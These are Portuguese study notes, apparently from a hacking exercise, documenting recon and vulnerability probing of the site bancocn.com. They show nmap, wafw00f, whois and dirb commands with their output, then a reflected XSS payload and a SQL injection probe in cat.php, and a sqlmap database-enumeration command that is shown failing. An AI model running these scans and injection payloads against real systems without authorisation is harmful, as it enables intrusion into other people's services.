# Hacking Skills - Banco CN

## Buscando por falhas nas portas

### Nmap
`nmap -v -A [URL SITE]`

- **-v (Verbose):**
  - Aumenta o nível de verbosidade. Com esta opção, o Nmap fornece mais informações sobre o progresso da varredura enquanto ela está em andamento. Isso pode incluir detalhes sobre cada etapa da varredura e resultados intermediários.
  
- **-A (Aggressive Scan):**
  - Habilita uma série de recursos avançados que fornecem informações detalhadas sobre o alvo. Inclui:
    - **Detecção de Sistema Operacional:** Tenta identificar o sistema operacional do host alvo.
    - **Detecção de Versão de Serviços:** Identifica versões de serviços que estão sendo executados nas portas abertas.
    - **Script Scanning:** Executa scripts do Nmap Scripting Engine (NSE) que podem detectar vulnerabilidades e coletar informações adicionais.
    - **Traceroute:** Determina o caminho que os pacotes tomam até alcançar o host alvo.

O comando `nmap -v -A` é extremamente útil para obter uma visão abrangente e detalhada de um host alvo. Ele combina várias técnicas de varredura para fornecer informações detalhadas sobre portas, serviços, sistemas operacionais e caminhos de rede, tornando-o uma ferramenta poderosa para administradores de rede e profissionais de segurança.

<details>

<summary>Exemplo de Uso</summary>

O comando `nmap -v -A` é uma varredura avançada e detalhada que combina várias técnicas para obter o máximo de informações possíveis sobre o(s) alvo(s) especificado(s). Vamos detalhar o que cada uma das opções faz:

### Exemplo de Uso

Vamos ver um exemplo de como usar `nmap -v -A` para escanear um endereço IP específico, digamos `192.168.1.1`:

```bash
nmap -v -A 192.168.1.1
```

### O que Esperar da Saída

Ao executar este comando, você pode esperar receber as seguintes informações detalhadas:

1. **Informações de Progresso:**
   - Detalhes sobre cada etapa da varredura, incluindo a descoberta inicial de hosts, a verificação de portas abertas e a identificação de serviços.

2. **Portas Abertas e Serviços:**
   - Lista de portas abertas no host alvo e os serviços associados a essas portas.
   - Versões dos serviços em execução (se possível).

3. **Sistema Operacional:**
   - Tentativa de identificação do sistema operacional do host alvo, incluindo possíveis versões.

4. **Traceroute:**
   - Caminho de rede (hops) que os pacotes percorrem para alcançar o host alvo.

5. **Scripts NSE:**
   - Resultados dos scripts NSE que foram executados, os quais podem incluir verificações de vulnerabilidades, descoberta de informações adicionais sobre serviços, etc.

### Saída Típica

Aqui está um exemplo de como pode parecer a saída de `nmap -v -A` (alguns detalhes foram abreviados para brevidade):

```plaintext
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-26 12:34 UTC
Initiating Ping Scan at 12:34
Scanning 192.168.1.1 [4 ports]
Completed Ping Scan at 12:34, 0.00s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:34
Scanning 192.168.1.1 [1000 ports]
Discovered open port 22/tcp on 192.168.1.1
Discovered open port 80/tcp on 192.168.1.1
Completed SYN Stealth Scan at 12:34, 0.15s elapsed (1000 total ports)
Initiating Service scan at 12:34
Scanning 2 services on 192.168.1.1
Completed Service scan at 12:34, 6.10s elapsed (2 services on 1 host)
Initiating OS detection at 12:34
Nmap scan report for 192.168.1.1
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
MAC Address: 00:0C:29:68:8C:AA (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT    ADDRESS
1   0.12 ms 192.168.1.1

Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
           Raw packets sent: 1052 (46.268KB) | Rcvd: 1049 (42.040KB)
```

</details>

----

## Capturando informações no site (www.bancocn.com)

### Verificando o firewall

**Instalando o wafw00f**
`sudo apt-get install wafw00f`

`wafw00f http://bancocn.com`

**Output**:
```bash
[*] Checking http://bancocn.com
[+] The site http://bancocn.com is behind Cloudflare (Cloudflare Inc.) WAF.
[~] Number of requests: 2
```

### Footprinting w/ WHOIS

- [Whois site](https://who.is/)

- **Install whois with** `sudo apt-get install whois`
    - `whois bancocn.com`
    
```bash
whois bancocn.com
```


### HTTP/HTTPS

**Hosteamendo**

```bash
host bancocn.com

bancocn.com has address 104.21.52.8
bancocn.com has address 172.67.192.199
bancocn.com has IPv6 address 2606:4700:3033::6815:3408
bancocn.com has IPv6 address 2606:4700:3034::ac43:c0c7
bancocn.com mail is handled by 10 googlemail.com.
```

### Também utilizei o NMAP

Nmap: `nmap -v -A www.bancocn.com`

### Resultados

Após a análise de portas no site, descobri que a proteção é feita por um proxy (CloudFlare)

- **IP ADDRESS (FIREWALL - CloudFlare)**: `104.21.52.8`
- **Firewall**: CloudFlare

- **Name Server**: MEGAN.NS.CLOUDFLARE.COM
- **Name Server**: NOEL.NS.CLOUDFLARE.COM

- **Portas abertas do serviço web**:
    - 80/tcp   open  http
    - 443/tcp  open  https
    - 8080/tcp open  http-proxy
    - 8443/tcp open  https-alt


**IP INFO (PROXY)**
```json
{
    "status":"success","continent":"North America",
    "continentCode":"NA","country":"Canada",
    "countryCode":"CA","region":"ON",
    "regionName":"Ontario","city":"Toronto",
    "district":"",
    "zip":"M5A",
    "lat":43.6532,"lon":-79.3832,
    "timezone":"America/Toronto",
    "offset":-14400,
    "currency":"CAD",
    "isp":"Cloudflare, Inc.",
    "org":"Cloudflare, Inc.",
    "as":"AS13335 Cloudflare, Inc.",
    "asname":"CLOUDFLARENET",
    "reverse":"",
    "mobile":false,
    "proxy":false,
    "hosting":true,
    "query":"104.21.52.8"
}
```

### WHOIS IP ADDRESS FIREWALL

```bash
whois 104.21.52.8

NetRange:       104.16.0.0 - 104.31.255.255
CIDR:           104.16.0.0/12
NetName:        CLOUDFLARENET
NetHandle:      NET-104-16-0-0-1
Parent:         NET104 (NET-104-0-0-0-0)
NetType:        Direct Allocation
OriginAS:       AS13335
Organization:   Cloudflare, Inc. (CLOUD14)
RegDate:        2014-03-28
Updated:        2021-05-26
Comment:        All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse
Ref:            https://rdap.arin.net/registry/ip/104.16.0.0
[***]
```

### Comunicação (no site)

- **Email (contato):** contato@bancocn.com
- **Email (fazer pedidod)**: emprestimos@bancocn.com
- **telefone**: +835 66 7070

### Sobre o site

### dirb

**DIRB** é um scanner web. Esta ferramenta pega por serviços existentes (e/ou escondidos) numa aplicação WEB. Ele funciona, basicamente, lançando senhas (BruteForce) de um dicionário no site no servidor web do site, analisando e enviando os resultados no terminal.

**Installed size**: `1.43 MB`
**How to install**: `sudo apt install dirb`

`dirb http://www.bancocn.com/`

> **Subdominios**

```txt
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://www.bancocn.com/ ----
==> DIRECTORY: http://www.bancocn.com/admin/                                                       
==> DIRECTORY: http://www.bancocn.com/assets/                                                      
==> DIRECTORY: http://www.bancocn.com/classes/                                                     
==> DIRECTORY: http://www.bancocn.com/css/                                                         
==> DIRECTORY: http://www.bancocn.com/images/                                                      
+ http://www.bancocn.com/index.php (CODE:200|SIZE:12522)                                           
+ http://www.bancocn.com/robots.txt (CODE:200|SIZE:31)                                             
+ http://www.bancocn.com/server-status (CODE:403|SIZE:280)                                         
                                                                                                   
---- Entering directory: http://www.bancocn.com/admin/ ----
+ http://www.bancocn.com/admin/bbclone (CODE:520|SIZE:15)                                          
+ http://www.bancocn.com/admin/bb-hist (CODE:520|SIZE:15)                                          
+ http://www.bancocn.com/admin/bb-histlog (CODE:520|SIZE:15)                                       
+ http://www.bancocn.com/admin/bboard (CODE:520|SIZE:15)                                           
+ http://www.bancocn.com/admin/bbs (CODE:520|SIZE:15)                                              
+ http://www.bancocn.com/admin/bc (CODE:520|SIZE:15)                                               
+ http://www.bancocn.com/admin/bd (CODE:520|SIZE:15)                                               
+ http://www.bancocn.com/admin/bdata (CODE:520|SIZE:15)                                            
+ http://www.bancocn.com/admin/be (CODE:520|SIZE:15)                                               
+ http://www.bancocn.com/admin/bea (CODE:520|SIZE:15)                                              
+ http://www.bancocn.com/admin/bean (CODE:520|SIZE:15)                                             
+ http://www.bancocn.com/admin/beans (CODE:520|SIZE:15)                                            
+ http://www.bancocn.com/admin/index.php (CODE:302|SIZE:0)                                         
==> DIRECTORY: http://www.bancocn.com/admin/uploads/                         
```

- **Classes (PHP)**: http://www.bancocn.com/classes/

| Name | LM | Size | Description |
| ---- | ---- | ---- | ---- |
| auth.php | 2020-07-03 15:38 | 391 | "" |
| category.php | 2020-07-03 15:38 | 1.3K | "" |
| db.php | 2020-07-03 15:38 | 124 | "" |
| phpfix.php | 2020-07-03 15:38 | 100 | "" |
| picture.php | 2020-07-03 15:38 | 3.1K | "" |
| stats.php | 2020-07-03 15:38 | 455 | "" | 
| user.php | 2020-07-03 15:38 | 550 | "" |

`Apache/2.4.29 (Ubuntu) Server at www.bancocn.com Port 80`

- **Robots**: http://www.bancocn.com/robots.txt

```txt
User-agent: *
Disallow: /admin
```

----

## Testando falhas no site

Falhas de segurança que encontrei no site `bancocn.com`

**Resposta do console**: `JQMIGRATE: Migrate is installed, version 1.4.1`

### XSS (Cross Site Scripting)

A partir das urls (abaixo), testei comando de JavaScript para verificar se o comando executaria

**O/ Pages [Contato/Emprestimos/Historia]**: http://www.bancocn.com/cat.php?id={:id}(1/3)

**Comando**:
```txt
http://www.bancocn.com/cat.php?id=%3Cscript%3Ealert(%22Hello%22)%3C/script%3E
```

### SQL (MariaDB)

Ao executar o comando acima, descobri também que o site apresentou o erro de sintaxe para erros de banco de dados, especificamente, para MariaDB.

```txt
http://www.bancocn.com/cat.php?id='
```

**SQLMap Official Site**: https://sqlmap.org/

```bash
sudo apt-get install sqlmap
```

Mesmo descobrindo que o site possui falha de escrita SQL, o `sqlmap` não conseguiu fazer uma busca pelos bancos de dados na aplicação e respondeu com o seguinte erro

Comando sqlmap: `sqlmap -u "www.bancocn.com/cat.php?id=1" --dbs --batch`

```bash
[09:42:00] [WARNING] GET parameter 'id' does not seem to be injectable
[09:42:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Please retry with the switch '--text-only' (along with --technique=BU) as this case looks like a perfect candidate (low textual content along with inability of comparison engine to detect at least one dynamic parameter). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[09:42:00] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 86 times
```


